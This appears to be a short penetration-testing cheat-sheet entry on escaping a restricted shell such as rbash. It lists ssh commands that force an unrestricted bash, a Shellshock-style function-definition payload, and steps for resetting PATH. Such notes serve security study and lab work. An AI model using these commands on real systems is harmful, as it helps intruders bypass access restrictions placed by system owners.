If you manage to get access to a shell, but it's restricted, e.g.: rbash, where you cannot run simple comands such as cat, etc., try the following:

```
# Command execution
ssh <user>@<targetIP> -t '/bin/bash'

# Profile
ssh <user>@<targetIP> -t 'bash --noprofile'

# Shellshock
ssh <user>@<targetIP> -t "(){:;}; /bin/bash"
```

Check the PATH variable and update if needed:
```
echo $PATH

#Update $PATH:
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$PATH

```